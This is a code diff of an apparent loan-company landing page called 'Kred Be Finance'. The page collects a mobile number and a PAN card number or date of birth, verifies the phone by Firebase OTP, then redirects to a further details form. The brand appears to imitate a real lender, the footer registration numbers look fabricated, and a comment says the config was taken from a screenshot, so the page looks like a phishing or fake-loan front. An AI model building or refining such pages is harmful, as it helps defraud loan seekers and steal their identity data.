@@ -5,215 +5,140 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Kred Be Finance - Trusted Loan Services</title>
     <style>
-        :root {
-            --brand-blue: #002e6e; 
-            --accent-blue: #004fb6;
-            --bg-light: #f4f7f9;
-            --error-red: #ff3333;
-            --white: #ffffff;
-        }
-
+        :root { --brand-blue: #002e6e; --bg-light: #f4f7f9; --error-red: #ff3333; --white: #ffffff; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
-
         body { background-color: var(--bg-light); display: flex; flex-direction: column; min-height: 100vh; }
-
-        header {
-            background-color: var(--brand-blue);
-            color: var(--white);
-            padding: 20px 15px 70px 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom-left-radius: 50% 25px;
-            border-bottom-right-radius: 50% 25px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-        }
-
+        header { background-color: var(--brand-blue); color: var(--white); padding: 20px 15px 70px 15px; display: flex; justify-content: space-between; align-items: center; border-bottom-left-radius: 50% 25px; border-bottom-right-radius: 50% 25px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         .logo-container img { height: 45px; width: auto; display: block; }
         .welcome-text { font-size: 1.1rem; font-weight: bold; }
-
         .site-banner { width: 100%; margin-top: -30px; margin-bottom: 20px; }
         .site-banner img { width: 100%; height: auto; display: block; }
-
         main { flex: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; }
-
-        .card {
-            background: var(--white);
-            padding: 25px;
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
-            width: 100%;
-            max-width: 450px;
-        }
-
+        .card { background: var(--white); padding: 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 450px; }
         h2 { color: var(--brand-blue); margin-bottom: 20px; font-size: 1.2rem; text-transform: uppercase; }
-
-        /* Form Styling */
-        .form-group { text-align: left; margin-bottom: 15px; position: relative; }
+        .form-group { text-align: left; margin-bottom: 15px; }
         .form-group label { display: block; margin-bottom: 5px; font-weight: bold; color: #555; font-size: 0.9rem; }
-        
         .input-wrapper { display: flex; align-items: center; border: 1.5px solid #ddd; border-radius: 8px; overflow: hidden; background: #fff; }
         .prefix { padding: 12px; background: #eee; border-right: 1.5px solid #ddd; font-weight: bold; color: #333; }
         input { border: none; outline: none; padding: 12px; width: 100%; font-size: 1rem; }
-        
-        .error-border { border: 1.5px solid var(--error-red) !important; transition: 0.3s; }
-
+        #otp-section { display: none; margin-top: 15px; padding-top: 15px; border-top: 1px dashed #ddd; }
+        .otp-input { letter-spacing: 10px; text-align: center; font-weight: bold; font-size: 1.3rem; }
         .toggle-group { display: flex; gap: 10px; margin-bottom: 15px; }
         .toggle-btn { flex: 1; padding: 10px; border: 1.5px solid var(--brand-blue); border-radius: 8px; background: transparent; color: var(--brand-blue); cursor: pointer; font-weight: bold; }
         .toggle-btn.active { background: var(--brand-blue); color: #fff; }
-
-        .apply-btn {
-            background-color: var(--brand-blue);
-            color: var(--white);
-            text-decoration: none;
-            padding: 18px;
-            border-radius: 12px;
-            font-size: 1.2rem;
-            font-weight: 800;
-            display: block;
-            width: 100%;
-            border: none;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        .apply-btn:disabled { opacity: 0.7; cursor: not-allowed; }
-
+        .apply-btn { background-color: var(--brand-blue); color: var(--white); padding: 18px; border-radius: 12px; font-size: 1.2rem; font-weight: 800; display: block; width: 100%; border: none; cursor: pointer; }
         footer { background-color: var(--brand-blue); color: #dbe4ef; padding: 40px 20px; text-align: center; font-size: 0.85rem; margin-top: 50px; }
         .gst-box { background: rgba(255,255,255,0.1); padding: 8px; border-radius: 6px; display: inline-block; margin: 12px 0; }
-        .footer-links a { color: var(--white); text-decoration: none; margin: 0 10px; }
+        .footer-links a { color: var(--white); text-decoration: none; margin: 0 8px; }
     </style>
 </head>
 <body>
-
     <header>
         <div class="logo-container"><img src="kr.png" alt="Kred Be"></div>
         <div class="welcome-text">Welcome</div>
     </header>
-
-    <div class="site-banner">
-        <img src="banner.png" alt="Banner">
-    </div>
-
+    <div class="site-banner"><img src="banner.png" alt="Banner"></div>
     <main>
         <div class="card">
-            <h2>Enter Your Details</h2>
-            
-            <div class="form-group">
-                <label>Mobile Number</label>
-                <div class="input-wrapper" id="mobile-wrapper">
-                    <span class="prefix">+91</span>
-                    <input type="tel" id="mobile" placeholder="Enter 10 digit number" maxlength="10">
+            <h2 id="main-title">Enter Your Details</h2>
+            <div id="details-section">
+                <div class="form-group">
+                    <label>Mobile Number</label>
+                    <div class="input-wrapper" id="mobile-wrapper"><span class="prefix">+91</span><input type="tel" id="mobile" placeholder="10 Digit Number" maxlength="10"></div>
+                </div>
+                <div class="toggle-group">
+                    <button class="toggle-btn active" id="btn-pan" onclick="switchInput('PAN')">PAN Card</button>
+                    <button class="toggle-btn" id="btn-dob" onclick="switchInput('DOB')">Date of Birth</button>
+                </div>
+                <div class="form-group"><div class="input-wrapper" id="dyn-wrapper"><input type="text" id="dyn-input" placeholder="Enter PAN Card Number"></div></div>
+            </div>
+            <div id="otp-section">
+                <div class="form-group">
+                    <label>Enter 6-Digit OTP</label>
+                    <div class="input-wrapper" id="otp-wrapper"><input type="tel" id="otp-input" class="otp-input" placeholder="000000" maxlength="6"></div>
                 </div>
             </div>
-
-            <div class="toggle-group">
-                <button class="toggle-btn active" id="btn-pan" onclick="switchInput('PAN')">PAN Card</button>
-                <button class="toggle-btn" id="btn-dob" onclick="switchInput('DOB')">Date of Birth</button>
-            </div>
-
-            <div class="form-group">
-                <div class="input-wrapper" id="dynamic-wrapper">
-                    <input type="text" id="dynamic-input" placeholder="Enter PAN Card Number">
-                </div>
-            </div>
-
-            <button class="apply-btn" id="apply-btn" onclick="validateAndProcess()">Apply Now</button>
+            <div id="recaptcha-container"></div>
+            <button class="apply-btn" id="apply-btn" onclick="handleAction()">Apply Now</button>
         </div>
     </main>
-
     <footer>
         <p><strong>Kred Be Finance Pvt. Ltd.</strong></p>
-        <p>Registered Office: 402, Trade Centre, BKC G Block, Mumbai - 400051</p>
+        <p>402, Trade Centre, BKC G Block, Mumbai - 400051</p>
         <div class="gst-box">GSTIN: 27AACCB1234F1Z0 | CIN: U65990MH2023PTC123456</div>
-        <div class="footer-links">
-            <a href="#">Privacy Policy</a> | <a href="#">Terms & Conditions</a> | <a href="#">Contact Us</a>
-        </div>
-        <p style="margin-top:20px; opacity:0.7;">&copy; 2026 Kred Be Finance Pvt. Ltd.</p>
+        <div class="footer-links"><a href="#">Privacy Policy</a> | <a href="#">Terms & Conditions</a></div>
     </footer>
 
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+
     <script>
+        // Aapke screenshot se nikali gayi details
+        const firebaseConfig = {
+            apiKey: "AiZaSyABELwcTnrapD70i8F8ibKW-hU_Wp7l92k",
+            authDomain: "kredbe-1fb1c.firebaseapp.com",
+            projectId: "kredbe-1fb1c",
+            storageBucket: "kredbe-1fb1c.appspot.com",
+            messagingSenderId: "1091599704552",
+            appId: "1:1091599704552:web:c68b8a3930d68b73f8a393"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        
+        // Setup Invisible Recaptcha
+        window.recaptchaVerifier = new firebase.auth.RecaptchaVerifier('recaptcha-container', { 'size': 'invisible' });
+
         let currentType = 'PAN';
+        let confirmationResult;
 
         function switchInput(type) {
             currentType = type;
-            const input = document.getElementById('dynamic-input');
-            const btnPan = document.getElementById('btn-pan');
-            const btnDob = document.getElementById('btn-dob');
-            
-            // Remove error styles when switching
-            document.getElementById('dynamic-wrapper').classList.remove('error-border');
-
-            if (type === 'PAN') {
-                input.type = 'text';
-                input.placeholder = 'Enter PAN Card Number';
-                input.value = '';
-                btnPan.classList.add('active');
-                btnDob.classList.remove('active');
-            } else {
-                input.type = 'date';
-                input.value = '';
-                btnDob.classList.add('active');
-                btnPan.classList.remove('active');
-            }
+            const input = document.getElementById('dyn-input');
+            document.getElementById('btn-pan').classList.toggle('active', type==='PAN');
+            document.getElementById('btn-dob').classList.toggle('active', type==='DOB');
+            input.type = (type==='PAN') ? 'text' : 'date';
+            input.placeholder = (type==='PAN') ? 'Enter PAN Card Number' : '';
+            input.value = '';
         }
 
-        function validateAndProcess() {
-            const mobile = document.getElementById('mobile');
-            const dynInput = document.getElementById('dynamic-input');
-            const btn = document.getElementById('apply-btn');
-            const mobileWrapper = document.getElementById('mobile-wrapper');
-            const dynWrapper = document.getElementById('dynamic-wrapper');
+        function handleAction() {
+            if (!confirmationResult) sendOTP();
+            else verifyOTP();
+        }
 
-            let isValid = true;
-
-            // 1. Mobile Validation (10 Digits)
-            if (mobile.value.length !== 10 || isNaN(mobile.value)) {
-                mobileWrapper.classList.add('error-border');
-                isValid = false;
-            } else {
-                mobileWrapper.classList.remove('error-border');
-            }
-
-            // 2. Dynamic Input Validation
-            if (currentType === 'PAN') {
-                const panRegex = /[A-Z]{5}[0-9]{4}[A-Z]{1}/;
-                if (!panRegex.test(dynInput.value.toUpperCase())) {
-                    dynWrapper.classList.add('error-border');
-                    isValid = false;
-                } else {
-                    dynWrapper.classList.remove('error-border');
-                }
-            } else {
-                // DOB Validation (18+ Age)
-                const birthDate = new Date(dynInput.value);
-                const today = new Date();
-                let age = today.getFullYear() - birthDate.getFullYear();
-                const m = today.getMonth() - birthDate.getMonth();
-                if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) { age--; }
-                
-                if (isNaN(age) || age < 18) {
-                    dynWrapper.classList.add('error-border');
-                    isValid = false;
-                } else {
-                    dynWrapper.classList.remove('error-border');
-                }
-            }
-
-            if (!isValid) {
-                // Vibrate twice if failed
-                if (navigator.vibrate) { navigator.vibrate([200, 100, 200]); }
-                return;
-            }
-
-            // If Valid - Start Processing
-            btn.disabled = true;
-            btn.innerHTML = "Processing...";
+        function sendOTP() {
+            const mobile = document.getElementById('mobile').value;
+            if(!/^[6-9]\d{9}$/.test(mobile)) { alert("Kripya sahi 10-digit mobile number dalein"); return; }
             
-            setTimeout(() => {
-                window.location.href = "fillyourdetail.html";
-            }, 3500); // 3.5 seconds buffering
+            const btn = document.getElementById('apply-btn');
+            btn.disabled = true; btn.innerHTML = "Sending OTP...";
+
+            auth.signInWithPhoneNumber("+91" + mobile, window.recaptchaVerifier)
+                .then(result => {
+                    confirmationResult = result;
+                    document.getElementById('details-section').style.display = 'none';
+                    document.getElementById('otp-section').style.display = 'block';
+                    document.getElementById('main-title').innerHTML = "Verification";
+                    btn.disabled = false; btn.innerHTML = "Verify OTP";
+                }).catch(err => { 
+                    alert("Error: " + err.message); 
+                    btn.disabled = false; btn.innerHTML = "Apply Now"; 
+                    location.reload(); // Recaptcha error ke liye refresh
+                });
+        }
+
+        function verifyOTP() {
+            const code = document.getElementById('otp-input').value;
+            const btn = document.getElementById('apply-btn');
+            if(code.length !== 6) { alert("6-digit OTP dalein"); return; }
+
+            btn.disabled = true; btn.innerHTML = "Verifying...";
+            confirmationResult.confirm(code).then(() => {
+                btn.innerHTML = "Processing...";
+                setTimeout(() => { window.location.href = "fillyourdetail.html"; }, 3000);
+            }).catch(() => { alert("Galat OTP! Kripya phir se check karein."); btn.disabled = false; btn.innerHTML = "Verify OTP"; });
         }
     </script>
-
 </body>
-</html>
+    </html>
+    
